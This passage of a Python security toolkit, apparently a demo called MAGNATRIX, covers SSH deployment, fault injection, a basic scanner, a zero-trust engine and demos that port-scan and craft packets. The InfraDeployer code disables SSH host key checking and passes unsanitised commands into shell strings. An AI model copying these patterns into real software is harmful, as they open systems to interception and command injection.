        msg["timestamp"] = datetime.now(timezone.utc).isoformat()
        self.messages.append(msg)
        return msg

    def receive(self, message: Dict[str, Any]) -> str:
        if not self.ratchet:
            raise RuntimeError("Session not initialized")
        plaintext = self.ratchet.decrypt_message(message)
        message["direction"] = "incoming"
        message["plaintext"] = plaintext
        self.messages.append(message)
        return plaintext

    def export_bundle(self) -> Dict[str, Any]:
        return self.signal.get_public_bundle()


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — InfraDeployer (cloudalchemy/ansible-grafana inspired)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class DeploymentConfig:
    name: str
    host: str
    user: str = "root"
    port: int = 22
    packages: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    files: List[Dict[str, str]] = field(default_factory=list)
    commands: List[str] = field(default_factory=list)
    vars: Dict[str, Any] = field(default_factory=dict)


class InfraDeployer:
    """Infrastructure deployment engine (Ansible-inspired, SSH-based)."""
    def __init__(self):
        self.deployments: List[DeploymentConfig] = []
        self.results: List[Dict[str, Any]] = []

    def add_deployment(self, config: DeploymentConfig) -> None:
        self.deployments.append(config)

    def _ssh_exec(self, host: str, user: str, command: str, port: int = 22) -> Result[str]:
        ssh_cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p {port} {user}@{host} '{command}'"
        return PentestScriptRunner().run_command(ssh_cmd, timeout=60)

    def _scp_file(self, host: str, user: str, local: str, remote: str, port: int = 22) -> Result[str]:
        scp_cmd = f"scp -o StrictHostKeyChecking=no -P {port} {local} {user}@{host}:{remote}"
        return PentestScriptRunner().run_command(scp_cmd, timeout=60)

    def deploy(self, config: DeploymentConfig) -> Dict[str, Any]:
        info(f"Deploying {config.name} to {config.host}")
        result = {"name": config.name, "host": config.host, "steps": [], "success": True}
        if config.packages:
            pkg_cmd = f"sudo apt-get update && sudo apt-get install -y {' '.join(config.packages)}"
            r = self._ssh_exec(config.host, config.user, pkg_cmd, config.port)
            result["steps"].append({"step": "packages", "ok": r.ok, "output": r.data if r.ok else r.error})
        for f in config.files:
            r = self._scp_file(config.host, config.user, f["src"], f["dest"], config.port)
            result["steps"].append({"step": f"file_{f['dest']}", "ok": r.ok})
        for cmd in config.commands:
            r = self._ssh_exec(config.host, config.user, cmd, config.port)
            result["steps"].append({"step": f"cmd_{cmd[:30]}", "ok": r.ok})
        for svc in config.services:
            r = self._ssh_exec(config.host, config.user, f"systemctl is-active {svc}", config.port)
            result["steps"].append({"step": f"service_{svc}", "ok": r.ok and "active" in (r.data or "")})
        result["success"] = all(s["ok"] for s in result["steps"])
        self.results.append(result)
        return result

    def deploy_all(self) -> List[Dict[str, Any]]:
        return [self.deploy(d) for d in self.deployments]

    def generate_playbook(self) -> str:
        lines = ["---", "- hosts: all", "  become: yes", "  tasks:"]
        for dep in self.deployments:
            lines.append(f"    # Deployment: {dep.name}")
            for pkg in dep.packages:
                lines.append(f"    - name: Install {pkg}")
                lines.append(f"      apt: name={pkg} state=present")
            for f in dep.files:
                lines.append(f"    - name: Copy {f['dest']}")
                lines.append(f"      copy: src={f['src']} dest={f['dest']}")
            for cmd in dep.commands:
                lines.append(f"    - name: Run {cmd[:40]}")
                lines.append(f"      shell: {cmd}")
            for svc in dep.services:
                lines.append(f"    - name: Ensure {svc} is running")
                lines.append(f"      service: name={svc} state=started")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 7 — FaultInjector (Shopify/toxiproxy inspired)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class Toxic:
    name: str
    type: str
    direction: str = "downstream"
    toxicity: float = 1.0
    attributes: Dict[str, Any] = field(default_factory=dict)


class FaultInjector:
    """Network fault injection engine for chaos/resilience testing."""
    def __init__(self):
        self.proxies: Dict[str, Dict[str, Any]] = {}
        self.toxics: Dict[str, List[Toxic]] = {}
        self._enabled = False

    def create_proxy(self, name: str, listen: str, upstream: str) -> None:
        self.proxies[name] = {"name": name, "listen": listen, "upstream": upstream, "enabled": True}
        self.toxics[name] = []
        info(f"Proxy created: {name} ({listen} -> {upstream})")

    def add_toxic(self, proxy_name: str, toxic: Toxic) -> None:
        if proxy_name not in self.toxics:
            raise ValueError(f"Proxy {proxy_name} not found")
        self.toxics[proxy_name].append(toxic)
        info(f"Toxic added to {proxy_name}: {toxic.name} ({toxic.type})")

    def remove_toxic(self, proxy_name: str, toxic_name: str) -> None:
        if proxy_name in self.toxics:
            self.toxics[proxy_name] = [t for t in self.toxics[proxy_name] if t.name != toxic_name]

    def reset_proxy(self, proxy_name: str) -> None:
        if proxy_name in self.toxics:
            self.toxics[proxy_name] = []
        if proxy_name in self.proxies:
            self.proxies[proxy_name]["enabled"] = True

    def get_latency_toxic(self, latency_ms: int, jitter_ms: int = 0) -> Toxic:
        return Toxic(name=f"latency_{latency_ms}", type="latency", attributes={"latency": latency_ms, "jitter": jitter_ms})

    def get_timeout_toxic(self, timeout_ms: int) -> Toxic:
        return Toxic(name=f"timeout_{timeout_ms}", type="timeout", attributes={"timeout": timeout_ms})

    def get_bandwidth_toxic(self, rate: int) -> Toxic:
        return Toxic(name=f"bandwidth_{rate}", type="bandwidth", attributes={"rate": rate})

    def get_reset_peer_toxic(self) -> Toxic:
        return Toxic(name="reset_peer", type="reset_peer", attributes={})

    def apply_toxic_to_socket(self, sock: socket.socket, toxic: Toxic) -> bool:
        if random.random() > toxic.toxicity:
            return True
        if toxic.type == "latency":
            latency = toxic.attributes.get("latency", 0) / 1000.0
            jitter = toxic.attributes.get("jitter", 0) / 1000.0
            time.sleep(max(0, latency + random.uniform(-jitter, jitter)))
            return True
        elif toxic.type == "timeout":
            sock.settimeout(toxic.attributes.get("timeout", 1) / 1000.0)
            return True
        elif toxic.type == "reset_peer":
            try: sock.close()
            except: pass
            return False
        return True

    def list_proxies(self) -> List[Dict[str, Any]]:
        result = []
        for name, proxy in self.proxies.items():
            result.append({
                "name": name, "listen": proxy["listen"], "upstream": proxy["upstream"],
                "enabled": proxy["enabled"], "toxics": [t.name for t in self.toxics.get(name, [])],
            })
        return result

    def simulate_chaos(self, proxy_name: str, duration_sec: int = 30) -> None:
        info(f"Starting chaos simulation on {proxy_name} for {duration_sec}s")
        toxics = self.toxics.get(proxy_name, [])
        start = time.time()
        while time.time() - start < duration_sec:
            for toxic in toxics:
                if random.random() <= toxic.toxicity:
                    debug(f"Chaos: {toxic.name} ({toxic.type}) triggered")
                    if toxic.type == "latency":
                        time.sleep(toxic.attributes.get("latency", 100) / 1000.0)
                    elif toxic.type == "reset_peer":
                        warn(f"Simulated connection reset: {proxy_name}")
            time.sleep(1)
        info(f"Chaos simulation on {proxy_name} complete")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8 — GoScanner (oscardagrach/goyescas inspired)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class VulnFinding:
    severity: str
    title: str
    description: str
    evidence: str
    remediation: str
    cwe: Optional[str] = None
    cvss: Optional[float] = None


class GoScannerEngine:
    """Security scanner engine (Go-inspired concurrent patterns)."""
    def __init__(self):
        self.findings: List[VulnFinding] = []
        self._checks: List[Callable[[ScanTarget], List[VulnFinding]]] = []

    def register_check(self, check: Callable[[ScanTarget], List[VulnFinding]]) -> None:
        self._checks.append(check)

    def scan(self, target: ScanTarget) -> List[VulnFinding]:
        info(f"Starting security scan on {target.host}:{target.port}")
        all_findings: List[VulnFinding] = []
        for check in self._checks:
            try:
                findings = check(target)
                all_findings.extend(findings)
            except Exception as e:
                debug(f"Check failed: {e}")
        self.findings = all_findings
        return all_findings

    def scan_async(self, targets: List[ScanTarget]) -> Dict[str, List[VulnFinding]]:
        results: Dict[str, List[VulnFinding]] = {}
        def scan_one(target: ScanTarget) -> Tuple[str, List[VulnFinding]]:
            return f"{target.host}:{target.port}", self.scan(target)
        pool = ThreadPoolWorker(max_workers=10)
        futures = [pool.submit(scan_one, t) for t in targets]
        for f in futures:
            try:
                key, findings = f.result(timeout=60)
                results[key] = findings
            except Exception as e:
                debug(f"Async scan error: {e}")
        pool.shutdown()
        return results

    def get_summary(self) -> Dict[str, int]:
        counts: Dict[str, int] = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)

    def generate_report(self, fmt: str = "markdown") -> str:
        if fmt == "markdown":
            lines = ["# Security Scan Report", ""]
            lines.append(f"**Total Findings:** {len(self.findings)}")
            lines.append("")
            for sev in ["critical", "high", "medium", "low", "info"]:
                sev_findings = [f for f in self.findings if f.severity == sev]
                if sev_findings:
                    lines.append(f"## {sev.upper()} ({len(sev_findings)})")
                    for f in sev_findings:
                        lines.append(f"- **{f.title}**: {f.description}")
                        lines.append(f"  - Evidence: `{f.evidence}`")
                        lines.append(f"  - Remediation: {f.remediation}")
                        lines.append("")
            return "\n".join(lines)
        elif fmt == "json":
            return json.dumps([f.__dict__ for f in self.findings], indent=2, default=str)
        return ""


def check_default_credentials(target: ScanTarget) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    if target.port == 22:
        findings.append(VulnFinding(
            severity="high", title="SSH Default Credentials Possible",
            description="SSH service detected, default credentials may exist",
            evidence="Port 22 open", remediation="Enforce key-based auth, disable password auth",
            cwe="CWE-798"))
    return findings


def check_missing_headers(target: ScanTarget) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    if target.port in (80, 443, 8080, 8443):
        findings.append(VulnFinding(
            severity="medium", title="Missing Security Headers",
            description="Web service may be missing HSTS, CSP, X-Frame-Options",
            evidence=f"HTTP on port {target.port}", remediation="Implement strict security headers",
            cwe="CWE-693"))
    return findings


def check_ssl_tls(target: ScanTarget) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    if target.port == 443:
        findings.append(VulnFinding(
            severity="medium", title="SSL/TLS Configuration",
            description="Verify TLS version and cipher suites",
            evidence="HTTPS detected", remediation="Disable TLS 1.0/1.1, enable HSTS",
            cwe="CWE-326"))
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9 — ZeroTrust (neumaneuma/Appgate-API inspired)
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class PolicyRule:
    action: str
    resource: str
    identity: str
    conditions: List[str] = field(default_factory=list)
    time_restrictions: Optional[Dict[str, Any]] = None


class ZeroTrustEngine:
    """Zero Trust SDP policy engine (Appgate-inspired)."""
    def __init__(self):
        self.policies: List[PolicyRule] = []
        self.sessions: Dict[str, Dict[str, Any]] = {}
        self._identity_trust: Dict[str, float] = {}

    def add_policy(self, rule: PolicyRule) -> None:
        self.policies.append(rule)

    def authenticate(self, identity: str, factors: Dict[str, Any]) -> Result[str]:
        score = 0.0
        if factors.get("password_valid"): score += 0.3
        if factors.get("mfa_valid"): score += 0.4
        if factors.get("device_trusted"): score += 0.2
        if factors.get("location_known"): score += 0.1
        self._identity_trust[identity] = score
        if score >= 0.7:
            session_id = str(uuid.uuid4())
            self.sessions[session_id] = {
                "identity": identity, "trust_score": score,
                "created": datetime.now(timezone.utc).isoformat(), "factors": factors,
            }
            return Result.success(session_id)
        return Result.failure(f"Trust score too low: {score}")

    def authorize(self, session_id: str, resource: str, action: str) -> bool:
        session = self.sessions.get(session_id)
        if not session:
            return False
        identity = session["identity"]
        trust_score = session["trust_score"]
        for policy in self.policies:
            if policy.identity in (identity, "*"):
                if policy.resource in (resource, "*"):
                    conditions_met = all(self._eval_condition(c, session) for c in policy.conditions)
                    if conditions_met and policy.action == action:
                        if trust_score < 0.9 and action == "allow":
                            warn(f"Low trust allow for {identity} -> {resource}")
                        return action == "allow"
        return False

    def _eval_condition(self, condition: str, session: Dict[str, Any]) -> bool:
        if "trust_score >" in condition:
            threshold = float(condition.split(">")[1].strip())
            return session.get("trust_score", 0) > threshold
        return True

    def revoke_session(self, session_id: str) -> None:
        if session_id in self.sessions:
            del self.sessions[session_id]

    def get_sessions(self) -> Dict[str, Dict[str, Any]]:
        return self.sessions.copy()

    def generate_policy_yaml(self) -> str:
        lines = ["policies:"]
        for p in self.policies:
            lines.append(f"  - action: {p.action}")
            lines.append(f"    resource: {p.resource}")
            lines.append(f"    identity: {p.identity}")
            if p.conditions:
                lines.append("    conditions:")
                for c in p.conditions:
                    lines.append(f"      - {c}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10 — ResourceLib (Hack-with-Github/Awesome-Hacking inspired)
# ═══════════════════════════════════════════════════════════════════════════════

class ResourceLibrary:
    """Curated security resource library."""
    def __init__(self):
        self.resources: Dict[str, List[Dict[str, str]]] = {
            "books": [
                {"title": "The Web Application Hacker's Handbook", "author": "Dafydd Stuttard", "topic": "web"},
                {"title": "Hacking: The Art of Exploitation", "author": "Jon Erickson", "topic": "binary"},
                {"title": "The Tangled Web", "author": "Michal Zalewski", "topic": "web"},
                {"title": "Practical Binary Analysis", "author": "Dennis Andriesse", "topic": "reverse"},
                {"title": "Real-World Bug Hunting", "author": "Peter Yaworski", "topic": "web"},
            ],
            "tools": [
                {"name": "nmap", "category": "scanner", "url": "https://nmap.org"},
                {"name": "metasploit", "category": "exploitation", "url": "https://metasploit.com"},
                {"name": "burpsuite", "category": "web", "url": "https://portswigger.net/burp"},
                {"name": "wireshark", "category": "network", "url": "https://wireshark.org"},
                {"name": "ghidra", "category": "reverse", "url": "https://ghidra-sre.org"},
                {"name": "sqlmap", "category": "web", "url": "https://sqlmap.org"},
                {"name": "gobuster", "category": "scanner", "url": "https://github.com/OJ/gobuster"},
                {"name": "toxiproxy", "category": "chaos", "url": "https://github.com/Shopify/toxiproxy"},
            ],
            "frameworks": [
                {"name": "MITRE ATT&CK", "url": "https://attack.mitre.org", "type": "threat_model"},
                {"name": "OWASP Top 10", "url": "https://owasp.org/Top10", "type": "standard"},
                {"name": "NIST CSF", "url": "https://nist.gov/cyberframework", "type": "standard"},
                {"name": "PTES", "url": "http://pentest-standard.org", "type": "methodology"},
            ],
            "platforms": [
                {"name": "HackerOne", "url": "https://hackerone.com", "type": "bugbounty"},
                {"name": "Bugcrowd", "url": "https://bugcrowd.com", "type": "bugbounty"},
                {"name": "Intigriti", "url": "https://intigriti.com", "type": "bugbounty"},
            ],
        }

    def search(self, query: str, category: Optional[str] = None) -> List[Dict[str, str]]:
        results: List[Dict[str, str]] = []
        query_lower = query.lower()
        cats = [category] if category else list(self.resources.keys())
        for cat in cats:
            for item in self.resources.get(cat, []):
                text = " ".join(str(v) for v in item.values()).lower()
                if query_lower in text:
                    results.append({"category": cat, **item})
        return results

    def get_by_category(self, category: str) -> List[Dict[str, str]]:
        return self.resources.get(category, [])

    def add_resource(self, category: str, resource: Dict[str, str]) -> None:
        if category not in self.resources:
            self.resources[category] = []
        self.resources[category].append(resource)

    def export_json(self) -> str:
        return json.dumps(self.resources, indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 11 — SecurityKernel (main orchestrator + demo scenarios)
# ═══════════════════════════════════════════════════════════════════════════════

class SecurityKernel:
    """MAGNATRIX Security Kernel — unified interface to all security modules."""
    def __init__(self):
        self.config = Config.get()
        self.config.ensure_dirs()
        self.audit = AuditLog()
        self.alerts = AlertEngine(self.audit)
        self.brute = DirectoryBruteForcer()
        self.port_scanner = PortScanner()
        self.packet = PacketCrafter()
        self.wifi = WiFiSecurityScanner()
        self.exploit_db = ExploitDatabase()
        self.pentest = PentestScriptRunner()
        self.crypto = SecureMessenger()
        self.infra = InfraDeployer()
        self.fault = FaultInjector()
        self.scanner = GoScannerEngine()
        self.zt = ZeroTrustEngine()
        self.library = ResourceLibrary()
        self.bus = EventBus()
        self._wire_events()
        info("SecurityKernel initialized — all modules ready")

    def _wire_events(self) -> None:
        self.bus.subscribe("audit.entry", self.alerts.on_audit_entry)
        self.bus.subscribe("scan.finding", lambda f: self.audit.append(
            event_type="scan", source="scanner", actor="kernel",
            action="finding", resource=f.get("target", "unknown"),
            result="detected", details=f))

    def demo_audit_chain(self) -> None:
        info("=== Demo: Audit Chain ===")
        self.audit.append("auth", "webapp", "alice", "login", "dashboard", "success")
        self.audit.append("auth", "webapp", "bob", "login", "dashboard", "failure")
        self.audit.append("config", "system", "admin", "modify", "firewall", "success",
                         details={"old_port": 22, "new_port": 2222})
        valid, err = self.audit.verify_chain()
        success(f"Audit chain valid: {valid}" + (f" ({err})" if err else ""))
        info(f"Audit stats: {self.audit.stats()}")

    def demo_alert_engine(self) -> None:
        info("=== Demo: Alert Engine ===")
        self.alerts.start()
        entry = self.audit.append("auth", "app", "eve", "login", "admin_panel", "failure")
        self.alerts.on_audit_entry(entry)
        entry = self.audit.append("auth", "system", "mallory", "sudo", "root_shell", "success")
        self.alerts.on_audit_entry(entry)
        alerts = self.alerts.get_alerts()
        success(f"Generated {len(alerts)} alerts")

    def demo_exploit_patterns(self) -> None:
        info("=== Demo: Exploit Patterns ===")
        critical = self.exploit_db.search(severity="critical")
        success(f"Critical patterns: {len(critical)}")
        for p in critical[:3]:
            info(f"  - {p.name}: {p.description[:60]}...")

    def demo_port_scan(self, target: str = "127.0.0.1") -> None:
        info(f"=== Demo: Port Scan ({target}) ===")
        open_ports = self.port_scanner.scan_host(target)
        success(f"Open ports on {target}: {open_ports}")

    def demo_packet_craft(self) -> None:
        info("=== Demo: Packet Crafting ===")
        syn = self.packet.craft_syn_packet("192.168.1.100", "192.168.1.1", 54321, 80)
        success(f"Crafted SYN packet: {len(syn)} bytes")
        icmp = self.packet.craft_icmp_ping("192.168.1.100", "8.8.8.8")
        success(f"Crafted ICMP packet: {len(icmp)} bytes")

    def demo_fault_injection(self) -> None:
        info("=== Demo: Fault Injection ===")
        self.fault.create_proxy("api", "localhost:8080", "backend:3000")
        self.fault.add_toxic("api", self.fault.get_latency_toxic(500, 100))
        self.fault.add_toxic("api", self.fault.get_timeout_toxic(2000))
        proxies = self.fault.list_proxies()
        success(f"Configured {len(proxies)} proxies with toxics")

    def demo_zero_trust(self) -> None:
        info("=== Demo: Zero Trust ===")
        self.zt.add_policy(PolicyRule("allow", "api/users", "alice", ["trust_score > 0.8"]))
        self.zt.add_policy(PolicyRule("deny", "api/admin", "*", []))
        auth = self.zt.authenticate("alice", {
            "password_valid": True, "mfa_valid": True,
            "device_trusted": True, "location_known": True,
        })
        if auth.ok:
            session_id = auth.unwrap()
            allowed = self.zt.authorize(session_id, "api/users", "allow")
            success(f"Zero Trust: alice -> api/users = {allowed}")
            denied = self.zt.authorize(session_id, "api/admin", "allow")
            success(f"Zero Trust: alice -> api/admin = {denied}")

    def demo_security_scanner(self) -> None:
        info("=== Demo: Security Scanner ===")
        self.scanner.register_check(check_default_credentials)
        self.scanner.register_check(check_missing_headers)
        self.scanner.register_check(check_ssl_tls)
        target = ScanTarget(host="scanme.nmap.org", port=80)
        findings = self.scanner.scan(target)
        summary = self.scanner.get_summary()
        success(f"Scanner findings: {summary}")

    def demo_resource_lib(self) -> None:
        info("=== Demo: Resource Library ===")
        results = self.library.search("web")
        success(f"Found {len(results)} web security resources")
        tools = self.library.get_by_category("tools")
        success(f"Tools in library: {len(tools)}")

    def demo_secure_messaging(self) -> None:
        info("=== Demo: Secure Messaging ===")
        alice = SecureMessenger()
        bob = SecureMessenger()
        bob.initialize(alice.export_bundle())
        alice.initialize(bob.export_bundle())
        msg = alice.send("Hello Bob, this is secret!")
        plaintext = bob.receive(msg)
        success(f"Secure message delivered: '{plaintext}'")

    def run_all_demos(self) -> None:
        info("╔══════════════════════════════════════════════════════════════╗")
        info("║   MAGNATRIX Security Kernel — Batch A Demo Suite               ║")
        info("╚══════════════════════════════════════════════════════════════╝")
        self.demo_audit_chain()
        self.demo_alert_engine()
        self.demo_exploit_patterns()
        self.demo_port_scan()
        self.demo_packet_craft()
        self.demo_fault_injection()
        self.demo_zero_trust()
        self.demo_security_scanner()
        self.demo_resource_lib()
        self.demo_secure_messaging()
        info("═══════════════════════════════════════════════════════════════")
        success("All demos completed successfully")
        info(f"Total audit entries: {len(self.audit.entries)}")
        info(f"Total alerts: {len(self.alerts.alerts)}")
        info(f"Total exploit patterns: {len(self.exploit_db.patterns)}")
        info(f"Total resources: {sum(len(v) for v in self.library.resources.values())}")

    def generate_full_report(self) -> str:
        lines = ["# MAGNATRIX Security Kernel Report", ""]
        lines.append(f"Generated: {datetime.now(timezone.utc).isoformat()}")
        lines.append("")
        lines.append("## Audit Log")
        lines.append(f"- Total entries: {len(self.audit.entries)}")
        lines.append(f"- Chain valid: {self.audit.verify_chain()[0]}")
        lines.append("")
        lines.append("## Alerts")
        lines.append(f"- Total alerts: {len(self.alerts.alerts)}")
        for sev in ["critical", "high", "medium", "low"]:
            count = len([a for a in self.alerts.alerts if a["severity"] == sev])
            if count:
                lines.append(f"- {sev.upper()}: {count}")
        lines.append("")
        lines.append("## Exploit Patterns")
        lines.append(f"- Total patterns: {len(self.exploit_db.patterns)}")
        lines.append("")
        lines.append("## Resources")
        for cat, items in self.library.resources.items():
            lines.append(f"- {cat}: {len(items)}")
        lines.append("")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN — Entry point
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    kernel = SecurityKernel()
    kernel.run_all_demos()
    report = kernel.generate_full_report()
    report_path = os.path.join(Config.get().output_dir, "security_report.md")
    with open(report_path, "w") as f:
        f.write(report)
    success(f"Report written to {report_path}")
